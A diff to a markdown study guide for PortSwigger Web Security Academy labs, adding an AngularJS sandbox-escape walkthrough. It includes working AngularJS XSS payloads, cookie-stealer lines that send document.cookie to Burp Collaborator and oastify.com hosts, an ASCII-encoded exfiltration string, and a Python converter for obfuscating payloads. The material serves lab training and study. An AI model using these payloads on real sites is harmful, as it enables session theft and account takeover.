@@ -134,7 +134,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 ![DOM Invader](images/dom-invader.png)  
 
-### Vuln AngularJS  
+### Vulnerable AngularJS  
   
 >AngularJS expression below can be injected into the search function when angle brackets and double quotes HTML-encoded. The vulnerability is ***identified*** by noticing the search string is enclosed in an **ng-app** directive and `/js/angular 1-7-7.js` script included. Review the HTML code to ***identify*** the `ng-app` directive telling AngularJS that this is the root element of the AngularJS application.  
 
@@ -146,7 +146,8 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 {{$on.constructor('alert(1)')()}}
 ```  
 
->Cookie stealer payload that can be placed in iframe, hosted on an exploit server, resulting in the victim session cookie being send to Burp Collaborator.  
+>Cookie stealer payload using `on.constructor` that can be placed in iframe, hosted on an exploit server, resulting in the victim session cookie being send to Burp Collaborator.  
+>[PortSwigger cheat sheet for cross site scripting reference](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.0.1---1.1.5-(shorter))  
 
 ```JavaScript
 {{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}
@@ -159,6 +160,77 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 [PortSwigger Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)  
 
 [z3nsh3ll give an amazingly detail understanding on the constructor vulnerability in this lab on YouTube](https://youtu.be/QpQp2JLn6JA)  
+
+### AngularJS sandbox Escape  
+
+>Expert PortSwigger Lab exercise using AngularJS 1.4.4 and versions 1.x has reached end of life and is no longer maintained.  
+>This lab uses **AngularJS** in an unusual way where the `$eval` function is not available and you will be unable to use any strings in AngularJS.  
+>Objective, perform a cross-site scripting attack that escapes the sandbox and executes the payload without using the `$eval` function.  
+
+[z3nsh3ll - YouTube Video give a great explanation of this Reflected XSS with AngularJS Sandbox Escape Without Strings](https://youtu.be/gKLHVT67sU0?si=tqQMb5Y6xLA-jgR4)  
+
+>***Identify*** the `angular.module` in JavaScript source code:  
+
+![angularJS-sandbox-escape-identify.png](/images/angularJS-sandbox-escape-identify.png)  
+
+>The `key` variable value `search` is injected into the JavaScript created dynamically.  
+>No obvious security issue present here. However, the security of this code depends on how this controller and the extracted values are used in the back-end.  
+
+>The `$parse` method evaluates the AngularJS expression `$scope.query`.  
+
+>Using the `&` to add second key value pair to test payload dynamic code generated.  
+
+![angularJS-sandbox-escape-add-2nd-key pair](/images/angularJS-sandbox-escape-add-2nd-keypair.png)  
+
+>Changing the second added key value name to expression to determine if evaluated, `/?search=key1value&7*7=payload` and math result is 49.  
+
+![angularJS-sandbox-escape-2nd-key pair-eval](/images/angularJS-sandbox-escape-2nd-keypair-eval.png)  
+
+>Constructing a payload fails when using `alert()` as the second key name in how angularJS compile the code through the parser.  
+
+>[AngulaJS sandbox - See PortSwigger Client-Side template injection documents](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection)  
+
+>[PortSwigger CheatSheet Reference Sandbox 1.4.4 escape](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.4.4-(without-strings))  
+
+```
+1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=fuzzer
+```
+
+>Collaborator payload ***cookie stealer***:  
+
+```
+x=fetch(`https://gp9o1893jak1dze7utv2rkvr0i69uzio.oastify.com/?z=`+document.cookie)
+```
+
+>The ASCII decimal values for each character in the above payload string, separated by commas:
+
+```
+100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,39,104,116,116,112,115,58,47,47,103,112,57,111,49,56,57,51,106,97,107,49,100,122,101,55,117,116,118,50,114,107,118,114,48,105,54,57,117,122,105,111,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101
+
+Each number represents the ASCII decimal value of the corresponding character in the string.
+```  
+
+>Python script to convert any payload to ASCIII decimal values:  
+
+```python
+import sys
+
+print('Python String to ASCII Converter!')
+if len(sys.argv) != 2:
+    print("Usage: Python ascii_converter.py 'Payload_String'")
+    sys.exit(1)
+
+input_string = sys.argv[1]
+ascii_values = [str(ord(char)) for char in input_string]
+
+output = ",".join(ascii_values)
+print(output)
+print('PortSwigger Expert Academy Labs!')
+```  
+
+![python-script-ascii_converter.png](/images/python-script-ascii_converter.png)  
+
+>[PortSwigger Expert Lab: Reflected XSS with AngularJS sandbox escape without strings](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings)  
 
 ### Doc Write Location search  
 
@@ -3649,11 +3721,11 @@ CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
 
 Youtube Information Security content creators channels (***in no particular order***):  
 
-1. [Rana Khalil](https://www.youtube.com/@RanaKhalil101/videos)  
+1. [z3nsh3ll](https://www.youtube.com/@z3nsh3ll/videos)  
 2. [TJCHacking](https://www.youtube.com/@tjchacking/videos)  
 3. [intigriti](https://www.youtube.com/@intigriti/videos)  
 4. [Seven Seas Security](https://www.youtube.com/@7SeasSecurity/videos)  
-5. [z3nsh3ll](https://www.youtube.com/@z3nsh3ll/videos)  
+5. [Rana Khalil](https://www.youtube.com/@RanaKhalil101/videos)  
 6. [Tib3rius](https://www.youtube.com/@Tib3rius/videos)  
 7. [John Hammond](https://www.youtube.com/@_JohnHammond/videos)  
 8. [TraceTheCode](https://www.youtube.com/@TraceTheCode/videos)  
